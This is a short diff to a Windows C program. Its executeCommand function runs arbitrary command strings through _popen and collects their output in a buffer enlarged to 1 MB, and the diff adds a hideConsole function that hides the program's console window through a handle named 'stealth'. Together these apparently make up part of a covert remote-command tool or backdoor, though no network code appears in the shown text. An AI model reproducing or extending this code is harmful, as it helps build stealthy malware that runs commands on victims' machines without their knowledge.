@@ -3,7 +3,7 @@
 #include <stdlib.h>
 
 #define BUFFER_SIZE 1024
-#define RESPONSE_BUFFER_SIZE 1024 * 10  // 10 KB
+#define RESPONSE_BUFFER_SIZE 1024 * 1024    // 1MB (Windows\System32 includes many files..)
 
 const char *executeCommand(const char *cmd)
 {
@@ -14,7 +14,7 @@ const char *executeCommand(const char *cmd)
     memset(total_response, 0, sizeof(total_response));
     memset(container, 0, sizeof(container));
 
-    fp = _popen(cmd, "r");
+    fp = _popen(cmd, "rt");
     
     while(fgets(container, BUFFER_SIZE, fp) != NULL) 
     {
@@ -24,4 +24,14 @@ const char *executeCommand(const char *cmd)
     _pclose(fp);
 
     return total_response;
+}
+
+void hideConsole()
+{
+    HWND stealth;
+	
+    AllocConsole();
+	stealth = FindWindowA("ConsoleWindowClass", NULL);
+
+	ShowWindow(stealth, 0);
 }
